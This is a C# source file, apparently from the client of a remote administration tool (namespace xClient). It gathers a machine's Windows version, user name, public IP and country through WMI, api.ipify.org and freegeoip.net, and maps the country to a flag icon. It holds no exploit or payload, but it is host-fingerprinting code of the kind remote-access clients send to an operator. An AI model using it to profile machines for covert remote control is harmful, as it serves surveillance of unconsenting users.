using System;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.Text.RegularExpressions;
using System.Net;
using System.IO;
using System.Xml;

namespace xClient.Utils
{
    public class _GetINFO
    {
        public string IP, country, country_code,OS, user_n;
        public int country_f = 247;

        public static readonly string[] ImageList =
        {
            "ad", "ae", "af", "ag", "ai", "al",
            "am", "an", "ao", "ar", "as", "at", "au", "aw", "ax", "az", "ba",
            "bb", "bd", "be", "bf", "bg", "bh", "bi", "bj", "bm", "bn", "bo",
            "br", "bs", "bt", "bv", "bw", "by", "bz", "ca", "catalonia", "cc",
            "cd", "cf", "cg", "ch", "ci", "ck", "cl", "cm", "cn", "co", "cr",
            "cs", "cu", "cv", "cx", "cy", "cz", "de", "dj", "dk", "dm", "do",
            "dz", "ec", "ee", "eg", "eh", "england", "er", "es", "et",
            "europeanunion", "fam", "fi", "fj", "fk", "fm", "fo", "fr", "ga",
            "gb", "gd", "ge", "gf", "gh", "gi", "gl", "gm", "gn", "gp", "gq",
            "gr", "gs", "gt", "gu", "gw", "gy", "hk", "hm", "hn", "hr", "ht",
            "hu", "id", "ie", "il", "in", "io", "iq", "ir", "is", "it", "jm",
            "jo", "jp", "ke", "kg", "kh", "ki", "km", "kn", "kp", "kr", "kw",
            "ky", "kz", "la", "lb", "lc", "li", "lk", "lr", "ls", "lt", "lu",
            "lv", "ly", "ma", "mc", "md", "me", "mg", "mh", "mk", "ml", "mm",
            "mn", "mo", "mp", "mq", "mr", "ms", "mt", "mu", "mv", "mw", "mx",
            "my", "mz", "na", "nc", "ne", "nf", "ng", "ni", "nl", "no", "np",
            "nr", "nu", "nz", "om", "pa", "pe", "pf", "pg", "ph", "pk", "pl",
            "pm", "pn", "pr", "ps", "pt", "pw", "py", "qa", "re", "ro", "rs",
            "ru", "rw", "sa", "sb", "sc", "scotland", "sd", "se", "sg", "sh",
            "si", "sj", "sk", "sl", "sm", "sn", "so", "sr", "st", "sv", "sy",
            "sz", "tc", "td", "tf", "tg", "th", "tj", "tk", "tl", "tm", "tn",
            "to", "tr", "tt", "tv", "tw", "tz", "ua", "ug", "um", "us", "uy",
            "uz", "va", "vc", "ve", "vg", "vi", "vn", "vu", "wales", "wf",
            "ws", "ye", "yt", "za", "zm", "zw"
        };
        public _GetINFO()
        {
            get_os_name();
            user_n = Environment.UserName;
            get_ip_c();
            country_f = Array.IndexOf(ImageList, country_code.ToLower()) == -1 ? 247 : Array.IndexOf(ImageList, country_code.ToLower());
        }

         void TryGetWanIp()
        {
            string wanIp = "-";

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://api.ipify.org/");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0";
                request.Proxy = null;
                request.Timeout = 5000;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    using (Stream dataStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(dataStream))
                        {
                            wanIp = reader.ReadToEnd();
                        }
                    }
                }
            }
            catch (Exception)
            {
            }

            IP = wanIp;
        }

         void get_os_name()
        {
            string Name = "Unknown OS";
            using (
                ManagementObjectSearcher searcher =
                    new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
            {
                foreach (ManagementObject os in searcher.Get())
                {
                    Name = os["Caption"].ToString();
                    break;
                }
            }

            Name = Regex.Replace(Name, "^.*(?=Windows)", "").TrimEnd().TrimStart(); // Remove everything before first match "Windows" and trim end & start
            OS= Name;
        }

         void get_ip_c()
         {

             try
             {
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://freegeoip.net/xml/");
                 request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0";
                 request.Proxy = null;
                 request.Timeout = 5000;

                 using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                 {
                     using (Stream dataStream = response.GetResponseStream())
                     {
                         using (StreamReader reader = new StreamReader(dataStream))
                         {
                             string responseString = reader.ReadToEnd();

                             XmlDocument doc = new XmlDocument();
                             doc.LoadXml(responseString);

                             string xmlIp = doc.SelectSingleNode("Response//IP").InnerXml;
                             string xmlCountry = doc.SelectSingleNode("Response//CountryName").InnerXml;
                             string xmlCountryCode = doc.SelectSingleNode("Response//CountryCode").InnerXml;
                             string xmlRegion = doc.SelectSingleNode("Response//RegionName").InnerXml;
                             string xmlCity = doc.SelectSingleNode("Response//City").InnerXml;
                             string timeZone = doc.SelectSingleNode("Response//TimeZone").InnerXml;

                             IP = (!string.IsNullOrEmpty(xmlIp)) ? xmlIp : "-";
                             country = (!string.IsNullOrEmpty(xmlCountry)) ? xmlCountry : "Unknown";
                             country_code = (!string.IsNullOrEmpty(xmlCountryCode)) ? xmlCountryCode : "-";
                         }
                     }
                 }
             }
             catch
             {
                 country = "Unknown";
                 country_code = "-";

             }
             if (string.IsNullOrEmpty(IP))
                 TryGetWanIp();
         }
    }
}
